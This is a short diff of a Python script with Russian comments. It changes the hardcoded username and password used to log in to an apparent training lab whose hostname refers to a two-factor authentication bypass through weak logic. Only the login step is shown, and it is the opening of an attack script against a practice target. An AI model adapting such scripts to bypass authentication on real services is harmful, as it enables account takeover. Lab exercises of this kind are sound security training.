@@ -5,8 +5,8 @@ s = requests.Session()
 
 # 1. Получаем сессию: логинимся обычным пользователем
 login_data = {
-    'username': 'LaplasRouse',   # логин существующего пользователя
-    'password': 'Morty322'
+    'username': 'laplas',   # логин существующего пользователя
+    'password': '123123'
 }
 r = s.post('http://lap3-2fa_bypass_weak_logic.labs-is-here.online/login', data=login_data)
 print('Login status:', r.status_code)
